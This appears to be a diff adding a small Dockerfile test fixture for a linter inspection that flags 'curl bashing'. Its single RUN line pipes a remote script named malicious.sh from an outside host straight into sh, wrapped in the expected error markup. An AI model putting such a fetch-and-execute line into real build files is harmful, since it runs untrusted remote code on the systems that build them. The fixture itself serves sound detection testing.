@@ -1,0 +1,3 @@
+FROM ubuntu:21
+<error descr="Curl bashing detected
+Avoid using curl or wget with pipe (|) or redirection (>) to directly execute scripts from untrusted sources.">RUN curl -X https://protsenko.dev/malicious.sh | sh</error>
